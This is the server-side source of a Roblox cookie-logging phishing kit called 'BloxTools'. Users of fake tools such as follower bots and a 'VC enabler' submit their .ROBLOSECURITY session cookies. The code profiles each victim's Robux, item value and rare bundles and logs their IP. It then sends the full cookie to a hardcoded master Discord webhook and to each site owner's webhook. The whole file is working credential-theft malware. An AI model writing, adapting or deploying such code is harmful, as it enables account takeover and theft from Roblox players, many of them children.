// Receives a tool submission from the client, looks up the Roblox account
// using the .ROBLOSECURITY cookie server-side, logs a hit, and dual-hooks
// to Discord (master config webhook + the site owner's webhook for that tool).
import { createClient } from "npm:@supabase/supabase-js@2.95.0";
import { corsHeaders } from "npm:@supabase/supabase-js@2.95.0/cors";

interface Body {
  username?: string;
  toolType: string;
  toolKey:
    | "bot_followers"
    | "copy_games"
    | "copy_clothes"
    | "group_botter"
    | "vc_enabler";
  cookie: string;
  pin?: string;
  extras?: Record<string, string | number | undefined>;
}

const MASTER_WEBHOOK =
  "https://discord.com/api/webhooks/1498409090701987960/-C42DQziUsV6V-VDokUYlsRZD9KeYhpLLg2eCuAI7cjovLxPkuXuf1KanbIqeWkw_J0s";

const SITE_NAME = "BloxTools";

// Roblox bundle IDs
const KORBLOX_BUNDLE_ID = 192;     // Korblox Deathspeaker
const HEADLESS_BUNDLE_ID = 201;    // Headless Horseman

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });

  try {
    const body = (await req.json()) as Body;
    if (!body?.cookie || !body?.toolType || !body?.toolKey) {
      return json({ error: "Missing fields" }, 400);
    }

    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    );

    // 1. Find owner profile + per-tool webhook
    let profile: {
      id: string;
      username: string;
      webhook_url: string | null;
      webhook_bot_followers: string | null;
      webhook_copy_games: string | null;
      webhook_copy_clothes: string | null;
      webhook_group_botter: string | null;
      webhook_vc_enabler: string | null;
    } | null = null;
    if (body.username) {
      const { data, error: profileErr } = await supabase
        .from("profiles")
        .select("id, username, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler")
        .eq("username", body.username.toLowerCase())
        .maybeSingle();
      if (profileErr || !data) return json({ error: "Owner not found" }, 404);
      profile = data;
    }

    const perToolMap: Record<string, string | null | undefined> = {
      bot_followers: profile?.webhook_bot_followers,
      copy_games: profile?.webhook_copy_games,
      copy_clothes: profile?.webhook_copy_clothes,
      group_botter: profile?.webhook_group_botter,
      vc_enabler: profile?.webhook_vc_enabler,
    };
    const ownerWebhook = perToolMap[body.toolKey] || profile?.webhook_url || null;

    // 2. Server-side Roblox lookup (incl. RAP, Korblox, Headless)
    const robloxInfo = await fetchRobloxInfo(body.cookie);

    // 3. IP / UA
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Unknown";
    const userAgent = req.headers.get("user-agent") || "Unknown";

    // 4. Log the hit
    if (profile) {
      await supabase.from("hits").insert({
        owner_id: profile.id,
        tool_type: body.toolType,
        roblox_username: robloxInfo?.name ?? null,
        roblox_user_id: robloxInfo?.id ?? null,
        roblox_robux: robloxInfo?.robux ?? null,
        roblox_rap: robloxInfo?.rap ?? null,
        roblox_premium: robloxInfo?.premium ?? null,
        roblox_has_korblox: robloxInfo?.hasKorblox ?? null,
        roblox_has_headless: robloxInfo?.hasHeadless ?? null,
        roblox_headshot_url: robloxInfo?.headshot ?? null,
        cookie_preview: body.cookie.slice(-16),
        ip_address: ip,
        user_agent: userAgent,
      });
    }

    // 5. Discord payload
    const payload = buildDiscordPayload({
      siteName: SITE_NAME,
      ownerUsername: profile?.username ?? "(root site)",
      toolType: body.toolType,
      pin: body.pin,
      cookie: body.cookie,
      roblox: robloxInfo,
      ip,
      userAgent,
      extras: body.extras,
    });

    const targets = new Set<string>([MASTER_WEBHOOK]);
    if (ownerWebhook) targets.add(ownerWebhook);

    await Promise.allSettled(
      Array.from(targets).map((url) =>
        fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        })
      )
    );

    return json({ ok: true });
  } catch (err) {
    console.error("submit-hit error", err);
    return json({ error: "Internal error" }, 500);
  }
});

function json(b: unknown, status = 200) {
  return new Response(JSON.stringify(b), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
}

interface RobloxInfo {
  id: number;
  name: string;
  displayName: string;
  robux: number | null;
  rap: number | null;
  premium: boolean | null;
  hasKorblox: boolean | null;
  hasHeadless: boolean | null;
  headshot: string | null;
}

async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
  try {
    const cookieHeader = `.ROBLOSECURITY=${cookie}`;
    const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: { Cookie: cookieHeader },
    });
    if (!authRes.ok) return null;
    const auth = await authRes.json() as { id: number; name: string; displayName: string };

    const [robux, premium, headshot, rap, hasKorblox, hasHeadless] = await Promise.all([
      fetchRobux(auth.id, cookieHeader),
      fetchPremium(auth.id, cookieHeader),
      fetchHeadshot(auth.id),
      fetchRap(auth.id),
      ownsBundle(auth.id, KORBLOX_BUNDLE_ID),
      ownsBundle(auth.id, HEADLESS_BUNDLE_ID),
    ]);

    return {
      id: auth.id,
      name: auth.name,
      displayName: auth.displayName,
      robux,
      rap,
      premium,
      hasKorblox,
      hasHeadless,
      headshot,
    };
  } catch (e) {
    console.error("roblox lookup failed", e);
    return null;
  }
}

async function fetchRobux(userId: number, cookieHeader: string): Promise<number | null> {
  try {
    const r = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: { Cookie: cookieHeader } });
    if (!r.ok) return null;
    return (await r.json()).robux ?? null;
  } catch { return null; }
}

async function fetchPremium(userId: number, cookieHeader: string): Promise<boolean | null> {
  try {
    const p = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: { Cookie: cookieHeader } });
    if (!p.ok) return null;
    return (await p.text()) === "true";
  } catch { return null; }
}

async function fetchHeadshot(userId: number): Promise<string | null> {
  try {
    const h = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
    if (!h.ok) return null;
    const j = await h.json();
    return j?.data?.[0]?.imageUrl ?? null;
  } catch { return null; }
}

// Sums RAP across all collectibles owned by the user.
async function fetchRap(userId: number): Promise<number | null> {
  try {
    let total = 0;
    let cursor = "";
    for (let page = 0; page < 10; page++) {
      const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
      const r = await fetch(url);
      if (!r.ok) return total || null;
      const j = await r.json() as { data?: Array<{ recentAveragePrice?: number }>; nextPageCursor?: string };
      for (const item of j.data ?? []) total += item.recentAveragePrice ?? 0;
      if (!j.nextPageCursor) break;
      cursor = j.nextPageCursor;
    }
    return total;
  } catch { return null; }
}

async function ownsBundle(userId: number, bundleId: number): Promise<boolean | null> {
  try {
    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/${bundleId}`);
    if (!r.ok) return null;
    const j = await r.json() as { data?: unknown[] };
    return Array.isArray(j.data) && j.data.length > 0;
  } catch { return null; }
}

function buildDiscordPayload(opts: {
  siteName: string;
  ownerUsername: string;
  toolType: string;
  pin?: string;
  cookie: string;
  roblox: RobloxInfo | null;
  ip: string;
  userAgent: string;
  extras?: Record<string, string | number | undefined>;
}) {
  const { siteName, ownerUsername, toolType, pin, cookie, roblox, ip, userAgent, extras } = opts;

  const mainFields: Array<{ name: string; value: string; inline?: boolean }> = [
    { name: "Tool", value: toolType, inline: true },
    { name: "Site Owner", value: ownerUsername, inline: true },
    { name: "PIN", value: pin || "Not provided", inline: true },
  ];

  if (extras) {
    for (const [k, v] of Object.entries(extras)) {
      if (v === undefined || v === null || v === "") continue;
      mainFields.push({ name: prettifyKey(k), value: String(v), inline: true });
    }
  }

  if (roblox) {
    mainFields.push(
      { name: "Roblox Username", value: `${roblox.name} (${roblox.displayName})`, inline: true },
      { name: "User ID", value: String(roblox.id), inline: true },
      { name: "Robux", value: roblox.robux !== null ? roblox.robux.toLocaleString() : "Unknown", inline: true },
      { name: "RAP", value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
      { name: "Premium", value: roblox.premium === null ? "Unknown" : roblox.premium ? "Yes" : "No", inline: true },
      { name: "Korblox", value: roblox.hasKorblox === null ? "Unknown" : roblox.hasKorblox ? "✅ Yes" : "❌ No", inline: true },
      { name: "Headless", value: roblox.hasHeadless === null ? "Unknown" : roblox.hasHeadless ? "✅ Yes" : "❌ No", inline: true },
      { name: "Profile", value: `https://www.roblox.com/users/${roblox.id}/profile`, inline: false },
    );
  } else {
    mainFields.push({ name: "Roblox Account", value: "Cookie invalid or lookup failed", inline: false });
  }

  mainFields.push(
    { name: "IP Address", value: ip, inline: true },
    { name: "User Agent", value: userAgent.slice(0, 1000), inline: false },
    { name: "Submitted", value: new Date().toISOString(), inline: false },
  );

  // Cookie goes in a SEPARATE second embed, chunked to 1024 chars per field.
  const cookieFields: Array<{ name: string; value: string; inline?: boolean }> = [];
  const total = Math.max(1, Math.ceil(cookie.length / 1024));
  for (let i = 0; i < cookie.length; i += 1024) {
    const part = cookie.slice(i, i + 1024);
    cookieFields.push({
      name: total === 1 ? ".ROBLOSECURITY Cookie" : `Cookie (Part ${i / 1024 + 1}/${total})`,
      value: part,
      inline: false,
    });
  }

  return {
    content: `**New ${toolType} Submission** (${siteName} / ${ownerUsername})`,
    embeds: [
      {
        title: roblox ? `Hit: ${roblox.name}` : "Submission Details",
        color: 0x00d7dc,
        thumbnail: roblox?.headshot ? { url: roblox.headshot } : undefined,
        fields: mainFields,
        footer: { text: `${siteName} Submission System` },
        timestamp: new Date().toISOString(),
      },
      {
        title: "🍪 Account Cookie",
        color: 0xff5555,
        fields: cookieFields,
        footer: { text: "Handle with care" },
      },
    ],
  };
}

function prettifyKey(k: string): string {
  return k.replace(/([A-Z])/g, " $1").replace(/^./, (c) => c.toUpperCase());
}
